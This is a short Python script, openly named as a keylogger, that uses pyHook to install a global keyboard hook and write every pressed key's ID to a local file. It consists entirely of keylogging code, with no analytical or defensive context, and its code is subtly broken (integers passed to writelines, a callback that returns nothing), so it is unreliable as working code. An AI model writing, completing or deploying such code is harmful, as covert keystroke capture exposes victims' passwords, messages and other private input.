import pythoncom, pyHook

fopen = open('Keylogger_collecton.txt', 'w+')
def OnKeyboardEvent(event):
    fopen.writelines(event.KeyID)
    
    
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
fopen.close()
